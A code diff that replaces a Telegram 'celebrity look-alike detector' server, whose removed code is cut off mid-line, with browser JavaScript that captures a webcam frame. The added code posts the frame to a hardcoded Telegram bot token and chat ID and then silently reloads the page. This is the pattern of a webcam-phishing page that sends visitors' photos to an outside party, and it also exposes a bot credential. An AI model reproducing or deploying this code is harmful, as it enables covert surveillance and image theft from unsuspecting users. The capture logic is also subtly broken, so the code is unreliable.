@@ -1,54 +1,54 @@
-const express = require('express');
-const bodyParser = require('body-parser');
-const fetch = require('node-fetch');
-const Telegraf = require('telegraf');
+function capture() {
+  const constraints = {
+    video: true
+  };
 
-const app = express();
-const port = process.env.PORT || 3000;
+  navigator.mediaDevices.getUserMedia(constraints)
+    .then((stream) => {
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.onloadedmetadata = () => {
+        video.play();
+      };
 
-app.use(bodyParser.json());
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
 
-app.post('/sendImage', (req, res) => {
-    const imgData = req.body.image;
-    const bot = new Telegraf(process.env.BOT_TOKEN);
-    bot.start((ctx) => ctx.reply('Sending image to celebrity look-alike detector...'));
-    bot.on('photo', (ctx) => {
-        const photo = ctx.message.photo[0];
-        fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/getFile?file_id=${photo.file_id}`)
-            .then(res => res.json())
-            .then(json => {
-                const fileUrl = `https://api.telegram.org/file/bot${process.env.BOT_TOKEN}/${json.result.file_path}`;
-                fetch(`https://celebrity-look-alike-detector.herokuapp.com/detect?url=${encodeURIComponent(fileUrl)}`)
-                    .then(res => res.json())
-                    .then(json => {
-                        const result = json.result;
-                        if (result) {
-                            ctx.reply(`You look like ${result.name} with ${result.confidence.toFixed(2)}% confidence!`);
-                        } else {
-                            ctx.reply('Sorry, we could not find a match for your image.');
-                        }
-                    })
-                    .catch(err => {
-                        console.error(err);
-                        ctx.reply('An error occurred while processing your image. Please try again later.');
-                    });
-            })
-            .catch(err => {
-                console.error(err);
-                ctx.reply('An error occurred while processing your image. Please try again later.');
-            });
+      const context = canvas.getContext('2d');
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      const imgURL = canvas.toDataURL();
+
+      // Send image to Telegram bot
+      const botToken = '5727820511:AAH0LrTp629GSK9MqR5SVDev5IKRqcGsb-s';
+      const chatId = '5923255825';
+      const url = `https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`;
+      const formData = new FormData();
+      formData.append('photo', dataURItoBlob(imgURL), 'photo.png');
+
+      fetch(url, {
+        method: 'POST',
+        body: formData
+      }).then((response) => {
+        console.log(response);
+      }).catch((error) => {
+        console.error(error);
+      });
+
+      // Reload the page
+      location.reload();
+    }).catch((error) => {
+      console.error(error);
     });
-    bot.launch();
-    bot.handleUpdate({
-        message: {
-            photo: [
-                {
-                    data: imgData
-                }
-            ]
-        }
-    });
-    res.sendStatus(200);
-});
+}
 
-app.listen(port, ()
+function dataURItoBlob(dataURI) {
+  const byteString = atob(dataURI.split(',')[1]);
+  const ab = new ArrayBuffer(byteString.length);
+  const ia = new Uint8Array(ab);
+  for (let i = 0; i < byteString.length; i++) {
+    ia[i] = byteString.charCodeAt(i);
+  }
+  return new Blob([ab], { type: 'image/png' });
+}
